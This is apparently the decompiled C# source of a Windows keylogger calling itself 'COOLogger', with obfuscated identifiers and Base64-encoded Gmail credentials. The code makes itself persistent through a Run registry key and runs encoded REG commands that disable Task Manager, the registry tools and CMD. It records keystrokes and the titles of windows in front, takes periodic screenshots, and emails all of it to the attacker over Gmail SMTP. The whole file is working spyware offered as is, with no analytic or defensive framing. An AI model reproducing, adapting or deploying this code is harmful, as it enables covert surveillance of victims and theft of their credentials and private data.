using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class FwWldOvxTvzOYsH
{
	private static string tgHdcFlDptTtFyR = "di5rYXNoMTJAZ21haWwuY29t";

	private static string OkHfXTfvLgUdBvZ = "bWFzdGVyMTI=";

	private static string bIchpfLTUSXuCJm = "smtp.gmail.com";

	private static int zyPTWNmCueMPjMQ = 587;

	private static string IgvoYGJdGKYiERE;

	private static string qSomPwOzEdEPJbY;

	private static string vRphepHVqenMHjl;

	private static string SmrzpVeediFMTxL;

	private static string KadgYwMFoXZtWbo;

	private static string ZOtDECHrlsWjiyD;

	private static int KVPhRnXhnjvNbjk = 1200000;

	private static string SoCQwOBFeSQKcZv = null;

	private static string aehYxNGpXZuXbpz = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string UiVIiFEgNfRVuVg = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string aspMiHyuHXmIvFc = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object eaJXwwXgsVoUrKj = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string tRMprYexGvbWXVa = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage LSZpQQfVYQpSwuc = new MailMessage();

	private static SmtpClient VzjfUoeVjtccPCd = new SmtpClient();

	[AccessedThroughProperty("NxshCsjwIqpdPqN")]
	private static zMaIZLPodaUmjHc _NxshCsjwIqpdPqN;

	private static object pBETopyJEhwQjDx = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox hKoZVJdULZjSSFr = new RichTextBox();

	private static zMaIZLPodaUmjHc NxshCsjwIqpdPqN
	{
		get
		{
			return _NxshCsjwIqpdPqN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_NxshCsjwIqpdPqN != null)
			{
				zMaIZLPodaUmjHc.KeyDown -= orjIXQzikFhlzKf;
			}
			_NxshCsjwIqpdPqN = value;
			if (_NxshCsjwIqpdPqN != null)
			{
				zMaIZLPodaUmjHc.KeyDown += orjIXQzikFhlzKf;
			}
		}
	} = new zMaIZLPodaUmjHc();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		ZOtDECHrlsWjiyD = Conversions.ToString(true);
		vRphepHVqenMHjl = Conversions.ToString(false);
		SmrzpVeediFMTxL = Conversions.ToString(true);
		KadgYwMFoXZtWbo = Conversions.ToString(true);
		qSomPwOzEdEPJbY = Conversions.ToString(false);
		IgvoYGJdGKYiERE = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, eaJXwwXgsVoUrKj, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(eaJXwwXgsVoUrKj, (object)"\\cjzbaqgjazcIFnb.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(tRMprYexGvbWXVa + "\\cjzbaqgjazcIFnb.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(eaJXwwXgsVoUrKj, (object)"\\"), pBETopyJEhwQjDx))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(eaJXwwXgsVoUrKj, (object)"\\"), pBETopyJEhwQjDx)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(eaJXwwXgsVoUrKj, (object)"\\"), pBETopyJEhwQjDx)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(eaJXwwXgsVoUrKj, (object)"\\"), pBETopyJEhwQjDx)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(eaJXwwXgsVoUrKj, (object)"\\"), pBETopyJEhwQjDx) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(IgvoYGJdGKYiERE))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(pBETopyJEhwQjDx)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(pBETopyJEhwQjDx), Operators.ConcatenateObject(Operators.ConcatenateObject(eaJXwwXgsVoUrKj, (object)"\\"), pBETopyJEhwQjDx));
			}
		}
		if (Conversions.ToBoolean(qSomPwOzEdEPJbY))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(eaJXwwXgsVoUrKj, (object)"\\cjzbaqgjazcIFnb.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(vRphepHVqenMHjl))
		{
			Interaction.Shell(sfStQOqYpbfGfqk(aehYxNGpXZuXbpz), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(SmrzpVeediFMTxL))
		{
			Interaction.Shell(sfStQOqYpbfGfqk(UiVIiFEgNfRVuVg), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(KadgYwMFoXZtWbo))
		{
			Interaction.Shell(sfStQOqYpbfGfqk(aspMiHyuHXmIvFc), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(1200000);
		val.add_Tick((EventHandler)ZnVmZdDqoiBxUqP_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)VRcfuQRbkfJYrLe_Ticked);
		val2.Start();
		NxshCsjwIqpdPqN.BHDPSgCENXSuLdx();
		Application.Run();
	}

	private static string oKLVsZDTyGZhWCx()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string sfStQOqYpbfGfqk(string ZmlCFIzYngQyBVx)
	{
		byte[] bytes = Convert.FromBase64String(ZmlCFIzYngQyBVx);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void ZnVmZdDqoiBxUqP_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(ZOtDECHrlsWjiyD))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = nGBpWefdiTNUxLK(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(eaJXwwXgsVoUrKj, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(eaJXwwXgsVoUrKj, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(sfStQOqYpbfGfqk(tgHdcFlDptTtFyR));
				mailMessage.To.Add(sfStQOqYpbfGfqk(tgHdcFlDptTtFyR));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = hKoZVJdULZjSSFr.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(sfStQOqYpbfGfqk(tgHdcFlDptTtFyR), sfStQOqYpbfGfqk(OkHfXTfvLgUdBvZ));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				hKoZVJdULZjSSFr.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage lSZpQQfVYQpSwuc = LSZpQQfVYQpSwuc;
		lSZpQQfVYQpSwuc.From = new MailAddress(sfStQOqYpbfGfqk(tgHdcFlDptTtFyR));
		lSZpQQfVYQpSwuc.To.Add(sfStQOqYpbfGfqk(tgHdcFlDptTtFyR));
		lSZpQQfVYQpSwuc.Subject = "COOLogger Logs from - " + Environment.UserName;
		lSZpQQfVYQpSwuc.Body = hKoZVJdULZjSSFr.get_Text();
		lSZpQQfVYQpSwuc = null;
		SmtpClient vzjfUoeVjtccPCd = VzjfUoeVjtccPCd;
		vzjfUoeVjtccPCd.Host = "smtp.gmail.com";
		vzjfUoeVjtccPCd.Port = 587;
		vzjfUoeVjtccPCd.EnableSsl = true;
		vzjfUoeVjtccPCd.Credentials = new NetworkCredential(sfStQOqYpbfGfqk(tgHdcFlDptTtFyR), sfStQOqYpbfGfqk(OkHfXTfvLgUdBvZ));
		vzjfUoeVjtccPCd.Send(LSZpQQfVYQpSwuc);
		vzjfUoeVjtccPCd = null;
		hKoZVJdULZjSSFr.set_Text("");
	}

	public static void orjIXQzikFhlzKf(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = hKoZVJdULZjSSFr;
		val.set_Text(val.get_Text() + NxshCsjwIqpdPqN.RLBgppoteXeJWVl(e));
	}

	public static void VRcfuQRbkfJYrLe_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(SoCQwOBFeSQKcZv, oKLVsZDTyGZhWCx(), false) != 0)
		{
			SoCQwOBFeSQKcZv = oKLVsZDTyGZhWCx();
			if (Operators.CompareString(SoCQwOBFeSQKcZv, "", false) != 0)
			{
				RichTextBox val = hKoZVJdULZjSSFr;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + SoCQwOBFeSQKcZv + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string nGBpWefdiTNUxLK(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
